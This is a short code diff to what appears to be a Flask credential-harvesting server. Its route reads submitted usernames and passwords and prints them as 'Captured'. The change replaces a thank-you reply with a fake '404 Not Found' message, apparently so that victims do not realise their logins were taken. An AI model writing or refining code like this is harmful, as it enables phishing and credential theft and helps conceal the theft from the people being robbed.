@@ -17,7 +17,7 @@ def log_password():
     password = request.form.get('password')
     print(f"Captured username: {username}")
     print(f"Captured password: {password}")
-    return "Thank you! Your credentials have been received."
+    return "404 Not Found\nThe requested URL was not found on this server."
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
